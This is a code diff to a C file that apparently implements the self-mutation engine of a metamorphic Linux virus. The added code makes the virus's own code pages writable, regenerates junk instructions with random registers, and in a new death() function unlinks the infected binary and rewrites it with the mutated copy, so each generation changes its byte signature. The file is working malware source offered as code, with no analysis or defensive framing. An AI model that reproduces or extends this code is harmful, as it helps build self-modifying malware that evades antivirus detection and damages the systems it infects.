@@ -8,7 +8,13 @@
 #include "death.h"
 #include "syscall.h"
 
-__attribute__((section(".text#"))) int g_junk_offsets[1000] = {0};
+extern void __attribute__((naked)) _start(void);
+extern void end(void);
+
+#define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
+
+
+int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
 
 /*
    This is the matrix of source and destination register opcodes for Intel.
@@ -55,16 +61,31 @@ static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {
 		if (find_pattern(self, i) && j < NB_JUNK_MAX) {
 			junk_offsets[j] = i;
 			j++;
+			i += JUNK_LEN;
 		}
 	}
 }
 
+/* find and print the offsets */
+//static void fprint_offsets(uint8_t *self, size_t size) {
+//	for (size_t i = 0; i < size - JUNK_LEN; i++) {
+//		if (find_pattern(self, i)) {
+//			_printf("0x%x,", i);
+//		}
+//	}
+//}
+
+
 static void gen_junk(uint8_t *rdm_junk) {
-	uint8_t reg_1 = ((uint8_t)gen_key_64()) % 8;
-	uint8_t reg_2 = ((uint8_t)gen_key_64()) % 8;
+
+	uint8_t rand[2];
+	getrandom(rand, 2, 0);
+	uint8_t reg_1 = rand[0] % 4;
+	uint8_t reg_2 = rand[1] % 4;
 
 	while (reg_1 == reg_2) {
-		reg_2 = ((uint8_t)gen_key_64()) % 8;
+		getrandom(rand, 2, 0);
+		reg_2 = rand[1] % 4;
 	}
 
 	JUNK;
@@ -94,6 +115,8 @@ static void gen_junk(uint8_t *rdm_junk) {
 }
 
 static void replace_nop(uint8_t *self, int *junk_offsets) {
+
+
 	for (size_t i = 0; i < NB_JUNK_MAX ; i++) {
 		/* at this point junk_offsets is filled */
 		if (junk_offsets[i] == 0) {
@@ -110,6 +133,8 @@ static int make_writeable(uint8_t *self, size_t size) {
 	uintptr_t start = (uintptr_t)self;
 	uintptr_t end = start + size;
 
+	JUNK;
+
 	uintptr_t page_start = start & ~(PAGE_SIZE - 1);
 	uintptr_t page_end = (end + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
 
@@ -119,13 +144,18 @@ static int make_writeable(uint8_t *self, size_t size) {
 	return 0;
 }
 
-void prepare_mutate(void) {
+void prepare_mutate(int opt) {
+	(void)opt;
 
 	uintptr_t start = (uintptr_t)&_start;
 
 	make_writeable((uint8_t *)start, VIRUS_SIZE);
 
+	JUNK;
+
 	fill_offsets((uint8_t *)start, VIRUS_SIZE, g_junk_offsets);
+	//if (opt == 1)
+	//	fprint_offsets((uint8_t *)start, VIRUS_SIZE);
 }
 
 void mutate(void) {
@@ -137,88 +167,53 @@ void mutate(void) {
 	replace_nop((uint8_t *)start, g_junk_offsets);
 }
 
-//static int abs_path(char *self_name) {
-//	char buf[PATH_MAX];
-//	char proc_self_exe[] = "/proc/self/exe";
-//
-//	int ret = readlink(proc_self_exe, buf, PATH_MAX);
-//	if (ret == -1) {
-//		return -1;
-//	}
-//	buf[ret] = '\0';
-//
-//	ft_strncpy(self_name, buf, PATH_MAX);
-//
-//	return 0;
-//}
+int death(int start_offset, file_t *file) {
 
-//
-//int prepare_mutate(file_t *file) {
-//
-//	char self_name[PATH_MAX];
-//
-//	if (abs_path(self_name) == -1) {
-//		return -1;
-//	}
-//
-//	struct stat st;
-//	/* we could open the file with O_RDWR but text file is busy */
-//	int fd = open(self_name, O_RDONLY);
-//
-//	if (fd == -1) {
-//		return -1;
-//	}
-//
-//	if (fstat(fd, &st) == -1) {
-//		close(fd);
-//		return -1;
-//	}
-//
-//	/* we could use MAP_SHARED but we can't open the file with O_RDWR */
-//	uint8_t *self = (uint8_t *)mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
-//	if (self == MAP_FAILED) {
-//		close(fd);
-//		return -1;
-//	}
-//
-//	close(fd);
-//
-//	t_fileview mainview = {self, st.st_size};
-//
-//	file->view = &mainview;
-//	file->mode = st.st_mode;
-//	ft_strncpy(file->abs_path, self_name, PATH_MAX);
-//
-//	return 0;
-//}
-//
-//int death(file_t *file) {
-//
-//	int fd;
-//	t_fileview *view = file->view;
-//	char *self_name = file->abs_path;
-//
-//	if (unlink(self_name) == -1) {
-//		munmap(view->data, view->size);
-//		return -1;
-//	}
-//
-//	fd = open(self_name, O_CREAT | O_WRONLY | O_TRUNC, file->mode);
-//	if (fd == -1)
-//		return -1;
-//
-//	if (write(fd, view->data, view->size) == -1) {
-//		close(fd);
-//		munmap(view->data, view->size);
-//		return -1;
-//	}
-//
-//	if (munmap(view->data, view->size) == -1) {
-//		close(fd);
-//		return -1;
-//	}
-//
-//	close(fd);
-//
-//	return 0;
-//}
+
+	JUNK;
+
+	uint8_t *self = (uint8_t *)file->view->data;
+	char *self_name = file->abs_path;
+	int fd;
+
+	uintptr_t junk_pos = (uintptr_t)&g_junk_offsets - (uintptr_t)&_start;
+
+	uint8_t *junk = self + junk_pos;
+	ft_memcpy(junk, g_junk_offsets, sizeof(g_junk_offsets));
+
+
+	uint8_t *entry = self + start_offset;
+
+	JUNK;
+
+	replace_nop(entry, g_junk_offsets);
+
+	if (unlink(self_name) == -1) {
+		munmap(self, file->view->size);
+		return -1;
+	}
+
+	JUNK;
+
+	fd = open(self_name, O_CREAT | O_WRONLY | O_TRUNC, file->mode);
+	if (fd == -1)
+		return -1;
+
+
+	if (write(fd, self, file->view->size) == -1) {
+		close(fd);
+		munmap(self, file->view->size);
+		return -1;
+	}
+
+	JUNK;
+
+	if (munmap(self, file->view->size) == -1) {
+		close(fd);
+		return -1;
+	}
+
+	close(fd);
+
+	return 0;
+}
